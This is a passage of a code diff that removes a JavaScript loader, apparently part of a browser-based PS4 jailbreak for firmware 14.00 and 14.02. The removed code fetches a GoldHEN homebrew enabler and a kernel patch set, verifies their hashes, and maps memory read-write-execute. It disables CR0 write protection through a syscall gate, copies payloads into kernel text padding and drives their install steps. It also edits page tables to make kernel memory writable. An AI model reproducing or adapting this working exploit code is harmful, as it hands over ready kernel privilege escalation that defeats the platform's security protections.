   let core = -1, allowed = [];
   for (let b = 0; b < 128; b++) {
     if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
   }
-  if (core < 0) return { ok: false, note: "no core in the mask", originalMask: originalMask };
+  if (core < 0) return { ok: false, note: "no core in the mask" };
 
   mask.u8.fill(0);
   mask.u8[core >> 3] = 1 << (core & 7);
   rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
-  return { ok: rv === 0, core: core, allowed: allowed.join(","),
-           note: "setaffinity rv=" + rv, originalMask: originalMask };
+  return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
 }
 
-/* ------------------------------------------------------- the payload */
-
-/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
-   goes into a page that is executable only because the kernel patch opened
-   rwx, and it runs on its own thread so this one stays free. pthread_create
-   is taken out of WebKit's import table and checked against libkernel before
-   it is called -- a wrong pointer here runs the payload nowhere.
-
-   Must come after the handles are defused: the enabler can restart SceShellUI,
-   and if this process is torn down with the handles still live, that is the
-   hang. */
-/* Fetch a file once. Both loaders are handed the bytes, so deciding the
-   format does not cost a second request. */
-async function fetchBytes(url, tag) {
-  try {
-    const r = await fetch(url + (url.indexOf("?") < 0 ? "?" : "&") + "_=" + Date.now());
-    if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
-    return new Uint8Array(await r.arrayBuffer());
-  } catch (e) {
-    say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
-    return null;
-  }
-}
-
-/* Firmware-matched assets.  A stale or substituted binary is worse than a
-   clean refusal here because these blobs contain fixed kernel offsets.  Keep
-   this tiny SHA-256 implementation local so verification also works on the
-   PS4 browser when WebCrypto is unavailable. */
-const GOLDHEN_1400 = {
-  length: 297496,
-  sha256: "39452f5e1c305ac9efcb4745eef7958b4db8c6d85299529f08700970b009ea4d",
-};
-const GOLDHEN_1402_EXPERIMENTAL = {
-  length: 297931,
-  sha256: "23fa75217949cd1be4ba0531e726c05f4ca0a2e47ed9eedb598e23da4eeacca9",
-};
-const PATCHSET_1400 = {
-  length: 641,
-  sha256: "615f275b96831cc04173757db39e93f0d27b52888976af2a6444604aa8ac5dbf",
-};
-
-function sha256Hex(bytes) {
-  const K = [
-    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
-    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
-    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
-    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
-    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
-    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
-    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
-    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
-  ];
-  const bitLength = bytes.length * 8;
-  const paddedLength = (bytes.length + 9 + 63) & ~63;
-  const data = new Uint8Array(paddedLength);
-  data.set(bytes);
-  data[bytes.length] = 0x80;
-  const dv = new DataView(data.buffer);
-  dv.setUint32(paddedLength - 8, Math.floor(bitLength / 0x100000000), false);
-  dv.setUint32(paddedLength - 4, bitLength >>> 0, false);
-  const h = [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
-  const w = new Uint32Array(64);
-  const rotr = function (x, n) { return (x >>> n) | (x << (32 - n)); };
-  for (let base = 0; base < paddedLength; base += 64) {
-    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(base + i * 4, false);
-    for (let i = 16; i < 64; i++) {
-      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
-      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
-      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
-    }
-    let a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],z=h[7];
-    for (let i = 0; i < 64; i++) {
-      const s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
-      const ch = (e & f) ^ (~e & g);
-      const t1 = (z + s1 + ch + K[i] + w[i]) >>> 0;
-      const s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
-      const maj = (a & b) ^ (a & c) ^ (b & c);
-      const t2 = (s0 + maj) >>> 0;
-      z=g; g=f; f=e; e=(d+t1)>>>0; d=c; c=b; b=a; a=(t1+t2)>>>0;
-    }
-    h[0]=(h[0]+a)>>>0; h[1]=(h[1]+b)>>>0; h[2]=(h[2]+c)>>>0; h[3]=(h[3]+d)>>>0;
-    h[4]=(h[4]+e)>>>0; h[5]=(h[5]+f)>>>0; h[6]=(h[6]+g)>>>0; h[7]=(h[7]+z)>>>0;
-  }
-  return h.map(function (x) { return x.toString(16).padStart(8, "0"); }).join("");
-}
-
-function verifiedAsset(bytes, expected, label) {
-  if (!bytes || bytes.length !== expected.length) {
-    say("[g] " + label + " length mismatch -- refusing");
-    return false;
-  }
-  const digest = sha256Hex(bytes);
-  if (digest !== expected.sha256) {
-    say("[g] " + label + " SHA-256 mismatch -- refusing");
-    return false;
-  }
-  say("[g] " + label + " verified (" + bytes.length + " bytes)");
-  return true;
-}
-
-/* Which loader runs is decided by the CONTENT, not by the file name. There
-   are two forms and they look alike from outside:
-     - composite image: stub area plus payload at 0x50000, exactly
-       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
-       padding RW.
-     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
-       started as a thread.
-   A GoldHEN build of 297,496 bytes is the second form; going by its name it
-   would have taken the composite path and been rejected by the length
-   check. */
-
-/* The 641 byte kernel patch set. It belongs to GOLDHEN, not to the composite
-   image: afterglow's own fifteen patches cover 25 of the 51 write sites, and
-   the thirty that are missing -- one block around 0x125791 and three singles
-   -- are exactly what GoldHEN's own code expects to find.
-
-   It runs for both image forms. A raw payload that started without it brought
-   GoldHEN up (FTP answered) but left it running without its patches. */
-async function runPatchSet(room, k, kbase) {
-  const c = host();
-  const pset = await fetchBytes("patchset.bin", "g");
-  if (!pset || !pset.length) {
-    say("[g] patchset.bin not available from HTTP");
-    return false;
-  }
-  if (!verifiedAsset(pset, PATCHSET_1400, "14.00 patchset")) return false;
-  wrbuf(plus(room, 0xc0), pset);
-  say("[g] patchset.bin loaded " + pset.length + " bytes -- calling gate");
-  const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
-  say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
-      + ((pr && pr.lo >>> 0) || 0).toString(16));
-  if (!pr || pr.i32 !== 0) {
-    say("[g] patchset gate returned non-zero -- refusing to start GoldHEN");
-    return false;
-  }
-  const check = k.read(plus(kbase, 0x2fcb5c), 2);
-  if (!check || check.length !== 2 || check[0] !== 0xeb || check[1] !== 0x04) {
-    say("[g] patchset read-back failed at kernel +0x2fcb5c");
-    return false;
-  }
-  say("[g] patchset read-back verified");
-  return true;
-}
-
-function readFromUSB(filename) {
-  const mounts = ["/mnt/usb0/", "/mnt/usb1/"];
-  for (let m = 0; m < mounts.length; m++) {
-    const full = mounts[m] + filename;
-    const p = cstr(full);
-    const fd = sc(S.open, p.at, 0).i32;
-    if (fd < 0) { say("[usb] " + full + " not found"); continue; }
-    say("[usb] opened " + full + " fd=" + fd);
-    const end = sc(S.lseek, fd, 0, 2);
-    const size = end.lo >>> 0;
-    if (size === 0 || size > 0x200000) {
-      say("[usb] size 0x" + size.toString(16) + " out of range");
-      sc(S.close, fd);
-      continue;
-    }
-    sc(S.lseek, fd, 0, 0);
-    const buf = alloc(size);
-    let off = 0;
-    while (off < size) {
-      const want = Math.min(size - off, 0x10000);
-      const got = sc(S.read, fd, plus(buf.at, off), want).i32;
-      if (got <= 0) break;
-      off += got;
-    }
-    sc(S.close, fd);
-    if (off < size) {
-      say("[usb] " + full + " short read " + off + "/" + size);
-      continue;
-    }
-    say("[usb] " + size + " bytes loaded from " + full);
-    return buf.u8.slice(0, size);
-  }
-  return null;
-}
-
-async function loadEnabler(url, k, kbase, room) {
-  const firmware = host().firmware || "unknown";
-  if (firmware === "14.02") {
-    say("[e] GoldHEN 14.02 disabled after hardware kernel panic -- refusing safely");
-    return false;
-  }
-  if (firmware !== "14.00" && firmware !== "14.02") {
-    say("[e] GoldHEN is not enabled for firmware " + firmware + " -- refusing safely");
-    return false;
-  }
-  const candidate1402 = firmware === "14.02";
-  const asset = candidate1402 ? "goldhen-1402-experimental.bin" : url;
-  const expected = candidate1402 ? GOLDHEN_1402_EXPERIMENTAL : GOLDHEN_1400;
-  const label = candidate1402 ? "experimental GoldHEN 14.02 core" : "GoldHEN 14.00";
-  const blob = await fetchBytes(asset, "e");
-  if (blob === null || !blob) return false;
-  if (!verifiedAsset(blob, expected, label)) return false;
-  if (blob[0] !== 0xe9) { say("[e] GoldHEN entry is not a leading jmp -- refusing"); return false; }
-  if (candidate1402) {
-    /* The ZIP's patchset is byte-for-byte the 14.00 build and writes fixed
-       kernel addresses.  The reconstructed 14.02 payload applies its own
-       known GoldHEN patches; never corrupt 14.02 by running the 14.00 blob. */
-    say("[e] 14.02 experimental route: 14.00 patchset deliberately skipped");
-    say("[e] ShellCore, ShellUI and RemotePlay patch installers remain disabled in this candidate");
-  } else if (!(await runPatchSet(room, k, kbase))) {
-    return false;
-  }
-  return loadPayload(asset, blob);
-}
-
-async function loadPayload(url, vorab) {
-  const c = host();
-  let blob = vorab || null;
-  if (blob === null) {
-    blob = await fetchBytes(url, "p");
-    if (blob === null) return false;
-  }
-
-  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
-  if (blob[0] !== 0xe9) {
-    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
-    return false;
-  }
-
-  const size = (blob.length + 0x3fff) & ~0x3fff;
-  const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
-  const entry = v(m.lo, m.hi);
-  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
-    say("[p] mmap failed, errno " + c.errno()); return false;
-  }
-  /* A fresh anonymous page is RW and non-X on this firmware until a fault
-     adds X. loadPayload used to mmap prot=7 lazily and send a thread straight
-     in; the instruction fetch faulted and the console froze (thread rc=0,
-     then silence). Fault every page in as RW, mprotect the X on, and prove
-     the entry page executes from ring 3 first -- exactly the page-prep
-     loadGoldhen uses. A plain ret via callAddr runs in ring 3: if the page
-     carries no X the WebProcess dies instead of the console. */
-  for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
-  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
-    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-  codeAt(entry, 0).hex("c3");
-  const probe = c.callAddr(entry, []);
-  if (probe === undefined || probe === null) {
-    say("[p] entry page does not execute in ring 3 -- stopping"); return false;
-  }
-  say("[p] entry page executes in ring 3, loading payload");
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
-  }
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    const q = c.p.read8(plus(entry, o));
-    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
-      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
-    }
-  }
-  say("[p] payload copied and verified, starting thread");
-
-  /* The table blanks both pthread_create fields for this firmware, but only
-     one of them deserved it: the import slot is a WebKit offset and this
-     build's WebKit is the 13.52 one, while k_pthread_create is a libkernel
-     offset and libkernel did move. The second was only ever used to check the
-     first, so check it against libkernel's own bounds instead -- a slot that
-     resolves into libkernel is the right slot, whatever the table says. */
-  const SLOT_1352 = 0x3cb9c00;
-  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
-    ? c.off.wk___imp_pthread_create : SLOT_1352;
-  if (!c.webkitBase || !c.libkernelBase) {
-    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
-    return false;
-  }
-  const fnr = c.p.read8(c.webkitBase.add32(slot));
-  const fn = v(fnr.low, fnr.hi);
-  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
-    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
-        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
-    return false;
-  }
-  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));
-
-  const thr = alloc(8);
-  thr.u8.fill(0);
-  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
-  const handle = qAt(thr, 0);
-  const started = rc === 0 && (handle.hi >>> 0) > 0;
-  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
-      + (started ? " -- running" : " -- did NOT start"));
-  return started;
-}
-
-
-/* Raw GoldHEN loader, driven one call at a time through the gate instead of
-   handed to a blind pthread. The loader self-elevates via syscall 11 when run
-   as a thread, but a fault inside its ring-0 install then freezes the whole
-   console with no breadcrumb. Copying it into the kernel's executable padding
-   and calling each install step through afterglow's own gate names the call
-   that does not come back. Same paddingRW + gate + mark machinery loadGoldhen
-   uses; the step offsets are the loader's own (disassembled from the image),
-   not the composite kpayload's. */
-const RAW_STEPS = [
-  [0x17e9, "loader_init: firmware detect + import table"],
-  [0x391,  "goldhen_is_loaded"],
-  [0x1025, "patch_kernel_installer"],
-  [0xf2f,  "print_banner"],
-  [0x1841, "noop probe (is_kernel_pointer), carries M_TEMP override"],
-  [0x1829, "IMP_MALLOC wrapper, alloc 0x1000", { rdi: 0x1000 }],
-  [0x1807, "IMP_KMEM_ALLOC wrapper, alloc 0x1000", { rdi: 0x1000 }],
-  [0x1093, "load_and_start_kpayload: FTP/klog/BinLoader"],
-];
-
-async function loadRawKernel(url, k, kbase, room, vorab) {
-  const c = host();
-  let blob = vorab || null;
-  if (blob === null) {
-    blob = await fetchBytes(url, "p");
-    if (blob === null) return false;
-  }
-  if (!blob || !blob.length) { say("[p] empty raw payload"); return false; }
-  if (blob[0] !== 0xe9) { say("[p] not a leading-jmp raw payload -- refusing"); return false; }
-
-  let size = (blob.length + 0xfff) & ~0xfff;
-  if (size < 0x48000) size = 0x48000;          /* room for the gate/tram/mark offsets */
-  const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
-  const buf = v(m.lo, m.hi);
-  if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[p] mmap failed, errno " + c.errno()); return false; }
-  for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
-  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
-    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-  codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-  codeAt(buf, GH.tram + 0x200).hex("c3");
-  const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) {
-    say("[p] gate page does not execute in ring 3 -- stopping"); return false;
-  }
-  say("[p] gate page executes in ring 3");
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let j = 0; j < 4; j++) lo |= (blob[o + j] || 0) << (8 * j);
-    for (let j = 0; j < 4; j++) hi |= (blob[o + 4 + j] || 0) << (8 * j);
-    c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
-  }
-  say("[p] " + blob.length + " loader bytes staged at " + text(buf));
-  /* Kept only for offline comparison.  The production route never calls this
-     step-driver, and it must not rewrite instructions inside the payload. */
-
-  const t = plus(kbase, GH.rvaPad);
-  const tram = { n: 0 };
-  const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
-  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
-  const i32 = function (n) { for (let j = 0; j < 4; j++) b1(Math.floor(n / Math.pow(256, j)) % 256); };
-  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
-  const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
-  const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
-  const fire  = function () { const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]); return r.lo >>> 0; };
-  const markClear = function () { wr4(plus(buf, GH.mark), 0xDEADBEEF); wr4(plus(buf, GH.mark + 4), 0xDEADBEEF); };
-  const markRead = function () { return [rd4(plus(buf, GH.mark)), rd4(plus(buf, GH.mark + 4))]; };
-
-  say("[p] kernel base " + text(kbase) + ", padding " + text(t));
-  say("[p] ---> calling runPatchSet");
-  if (!(await runPatchSet(room, k, kbase))) return false;
-  say("[p] patchset ok ---> calling paddingRW");
-  if (!paddingRW(k, kbase)) { say("[p] stopping: padding would stay read only"); return false; }
-
-  /* whole loader image (loader + zlib + trailer) into the padding, PIC */
-  tram.n = 0;
-  wpOff();
-  hex("48be"); q64(buf);
-  hex("48bf"); q64(t);
-  hex("b9"); i32(blob.length);
-  hex("fc"); hex("f3a4");
-  wpOn();
-  hex("b8"); i32(0x5758); hex("c3");
-  const cp = fire();
-  if (cp !== 0x5758) { say("[p] copy into padding returned 0x" + cp.toString(16)); return false; }
-  say("[p] " + blob.length + " bytes into the padding");
-
-  let silent = 0;
-  for (let n = 0; n < RAW_STEPS.length; n++) {
-    const rva = RAW_STEPS[n][0], what = RAW_STEPS[n][1];
-    markClear();
-    tram.n = 0;
-    wpOff();
-    /* M_TEMP fix: the port's ksdk out[29] resolves M_TEMP to 0x2be1f0, which
-       is code, not a malloc_type -- so malloc(size, M_TEMP, 2) derefs code and
-       panics. The kernel's own malloc callers use the data zone at 0x1520d00
-       (171 callers). Overwrite the loader's M_TEMP global (image 0x47550) with
-       kbase+0x1520d00 before the malloc probe so the type is a real struct. */
-    if (rva === 0x1841) {
-      wr8(plus(buf, 0x47550), plus(kbase, 0x1520d00));
-      say("[p] diag: M_TEMP overridden -> kbase+0x1520d00 (was 0x2be1f0/code)");
-    }
-    const opt = RAW_STEPS[n][2] || {};
-    if (opt.rdi !== undefined) { hex("bf"); i32(opt.rdi); }   /* mov edi, imm32 */
-    else { hex("31ff"); }                                     /* xor edi,edi */
-    hex("31c0");
-    callAbs(rva);
-    hex("4898");
-    hex("48b9"); q64(plus(buf, GH.mark));
-    hex("488901");
-    wpOn(); hex("31c0"); hex("c3");
-    fire();
-    const mk = markRead();
-    if (mk[1] === 0xDEADBEEF) {
-      say("[p] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
-      silent++;
-      break;                           /* a fault here freezes; stop naming further steps */
-    }
-    let rc = mk[0];
-    if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-    say("[p] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc + " -- " + what);
-    if (n === 0 && rc !== 0) {
-      say("[p] loader_init failed, import table empty -- stopping before a bad call");
-      return false;
-    }
-  }
-  say("[p] raw loader chain finished, " + silent + " silent");
-  return silent === 0;
-}
-
-
-/* Kpayload step-driver: the inflated 14.02 kpayload (kpayload.bin, 642888
-   bytes) copied into the kernel padding and driven one install call at a time
-   through afterglow's gate. The loader hands the kpayload entry to a real
-   kernel stack and it panics with no breadcrumb; this names the call. The
-   patch groups are plain kernel-text writes (no malloc), so they survive the
-   gate stack -- the first silent step is the patch group holding the bad
-   14.02 offset. Offsets are the kpayload's own main chain at 0x2718. */
-const KP_STEPS = [
-  [0x11bd1, "init: firmware detect + import/offset tables"],
-  [0x5cf3,  "patch group 1"],
-  [0xa65,   "patch group 2"],
-  [0x10b2,  "patch group 3"],
-  [0x2b6d,  "patch group 4 (testkit + shell)"],
-  [0x256e,  "patch group 5 (syscalls 11/c5/c6)"],
-  [0x3426,  "patch group 6 (54 kernel patches + exec handler)"],
-];
-
-async function loadKpayloadSteps(k, kbase, room) {
-  const c = host();
-  const blob = await fetchBytes("kpayload.bin", "kp");
-  if (!blob || !blob.length) { say("[kp] kpayload.bin not available"); return false; }
-  say("[kp] " + blob.length + " bytes inflated kpayload");
-
-  const size = (0x50000 + blob.length + 0x4fff) & ~0xfff;
-  const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
-  const buf = v(m.lo, m.hi);
-  const data = plus(buf, 0x50000);
-  if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[kp] mmap failed, errno " + c.errno()); return false; }
-  for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
-  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) { say("[kp] mprotect rwx failed"); return false; }
-  codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-  codeAt(buf, GH.tram + 0x200).hex("c3");
-  const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) { say("[kp] gate page does not execute in ring 3"); return false; }
-  say("[kp] gate page executes in ring 3");
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let j = 0; j < 4; j++) lo |= (blob[o + j] || 0) << (8 * j);
-    for (let j = 0; j < 4; j++) hi |= (blob[o + 4 + j] || 0) << (8 * j);
-    c.p.write8(plus(data, o), v(lo >>> 0, hi >>> 0));
-  }
-  say("[kp] kpayload staged at " + text(data));
-
-  const t = plus(kbase, GH.rvaPad);
-  const tram = { n: 0 };
-  const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
-  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
-  const i32 = function (n) { for (let j = 0; j < 4; j++) b1(Math.floor(n / Math.pow(256, j)) % 256); };
-  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
-  const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
-  const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
-  const fire  = function () { const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]); return r.lo >>> 0; };
-  const markClear = function () { wr4(plus(buf, GH.mark), 0xDEADBEEF); wr4(plus(buf, GH.mark + 4), 0xDEADBEEF); };
-  const markRead = function () { return [rd4(plus(buf, GH.mark)), rd4(plus(buf, GH.mark + 4))]; };
-  const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
-
-  say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
-  if (!(await runPatchSet(room, k, kbase))) return false;
-  const dmapPad = paddingRW(k, kbase);
-  if (!dmapPad) { say("[kp] stopping: padding setup failed"); return false; }
-
-  say("[kp] rep movsb -> dmap " + text(dmapPad));
-  tram.n = 0;
-  wpOff();
-  hex("48be"); q64(data);
-  hex("48bf"); q64(dmapPad);
-  hex("b9"); i32(blob.length);
-  hex("fc"); hex("f3a4");
-  wpOn();
-  hex("b8"); i32(0x5758); hex("c3");
-  const cp = fire();
-  if (cp !== 0x5758) { say("[kp] copy returned 0x" + cp.toString(16)); return false; }
-  say("[kp] " + blob.length + " bytes into the padding");
-
-  let silent = 0;
-  for (let n = 0; n < KP_STEPS.length; n++) {
-    const rva = KP_STEPS[n][0], what = KP_STEPS[n][1];
-    markClear();
-    tram.n = 0;
-    wpOff();
-    const stepStack = plus(t, 0xff000);
-    hex("48b9"); q64(stepStack); hex("488921");   /* [stepStack] = rsp */
-    hex("48bc"); q64(stepStack);                  /* rsp = stepStack */
-    hex("31ff"); hex("31f6"); hex("31c0");        /* rdi=0, esi=0, eax=0 */
-    callAbs(rva);
-    hex("4898");
-    hex("48b9"); q64(plus(buf, GH.mark));
-    hex("488901");
-    hex("48b9"); q64(stepStack); hex("488b21");   /* rsp = [stepStack] */
-    wpOn(); hex("31c0"); hex("c3");
-    say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (stack " + text(stepStack) + ")");
-    fire();
-    const mk = markRead();
-    if (mk[1] === 0xDEADBEEF) {
-      say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
-      silent++;
-      break;
-    }
-    let rc = mk[0];
-    if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-    say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc + " -- " + what);
-    if (n === 0 && rc !== 0) {
-      say("[kp] init failed -- stopping before a bad call");
-      return false;
-    }
-  }
-  say("[kp] kpayload patch chain finished, " + silent + " silent");
-  return silent === 0;
-}/* ------------------------------------------------------- GoldHEN */
-
-/* This image is not a payload in the sense hen.bin is. The first 0x50000
-   bytes are a stub area -- a gate at 0x47c00, a trampoline at 0x47c40, a
-   marker pair at 0x47e80 -- and the GoldHEN payload proper sits at 0x50000
-   and is 636760 bytes, which together is exactly the file's length. The
-   payload is not run in userland at all: it is copied into the kernel's text
-   padding and main's chain is then driven one call at a time through
-   syscall 11, so that a call which does not come back can be named instead
-   of guessed. This follows the step order established in the Lua work.
-
-   The buffer must be a fresh mmap, not an allocator's: a calloc buffer is
-   not executable throughout -- measured, one page in eighteen -- and a ring 0
-   jump into a page without the bit is a panic without a signal. A fresh
-   mapping is executable throughout once the kernel patch is in. */
-const GH = {
-  tor: 0x47c00, tram: 0x47c40, mark: 0x47e80, kptr: 0x47b20,
-  nlOff: 0x50000, nlLen: 636760,
-  rvaPad: 0x10ff000, rvaKmem: 0x466540,
-};
-
-const GH_STEPS = [
-  [0x12f35, "detect firmware, fill the pointer table"],
-  [0x9ba88, "UI notice 'GoldHEN'", { ptr: true, rdi: 0x99eeb, esi: 0x1f4 }],
-  [0x5cc6,  "save the original pointer from [0x9b8c0]"],
-  [0x945,   "kernel patches A"],
-  [0xf92,   "kernel patches B"],
-  [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
-  [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
-  [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
-  [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
-  [0x32c4,  "inject klog      -> 3232"],
-  [0x325a,  "inject FTP       -> 2121"],
-  [0x328f,  "inject BinLoader -> 9090"],
-  [0x31af,  "inject mono ELF  -> SceShellUI"],
-  [0x1dd,   "last hook on sysent[591]; turns write protection back on"],
-  [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
-];
-
-/* The payload's BSS lives in the kernel's RX text padding, and it writes
-   into it 83 times without bracketing. During main's chain those writes get
-   through because every step is wrapped in wp_off/wp_on; GoldHEN's later
-   syscall hooks run with CR0.WP=1 and fall over -- the delayed death that
-   cost this project a day. One RW bit in the page directory entry that covers
-   the padding fixes it. It does not survive a reboot.
-
-   The Lua version drives every read through GoldHEN's own trampoline because
-   that is its only way into ring 0. We already hold afterglow's gate, so this
-   is plain reads and one write.
-
-   Three cross-checks before anything is written. A guessed read of a kernel
-   address cost two cold starts on the day this was first worked out. */
-const PT = {
-  g1: 0x1b2c394, g2: 0x1b2c398, kphys: 0x1b2c420, pmpml4: 0x1b2c3c0,
-  padFrom: 0x10ff000, padTo: 0x11ff000,
-};
-
-function paddingRW(k, kbase) {
-  const rd = function (a2) { return k.read_v(a2); };
-  const kat = function (rva) { return plus(kbase, rva); };
-
-  const g1 = rd(kat(PT.g1)), g2 = rd(kat(PT.g2));
-  if (!g1 || !g2) { say("[rw] the dmap dwords are not readable"); return null; }
-  /* DMAP = 0xffff800000000000 | (g1 << 39) | (g2 << 30) */
-  const a1 = g1.low >>> 0, a2v = g2.low >>> 0;
-  const dmap = v(((a2v & 3) * 0x40000000) >>> 0,
-                 (0xffff8000 | ((a1 << 7) >>> 0) | (a2v >>> 2)) >>> 0);
-
-  const kph = rd(kat(PT.kphys));
-  if (!kph) { say("[rw] KPML4phys not readable"); return null; }
-  /* the page directory root, as a kernel address through the direct map */
-  const p4 = v((dmap.low + kph.low) >>> 0,
-               (dmap.hi + kph.hi + (((dmap.low >>> 0) + (kph.low >>> 0) > 0xffffffff) ? 1 : 0)) >>> 0);
-
-  const pm = rd(kat(PT.pmpml4));
-  if (!pm || !same(pm, p4)) {
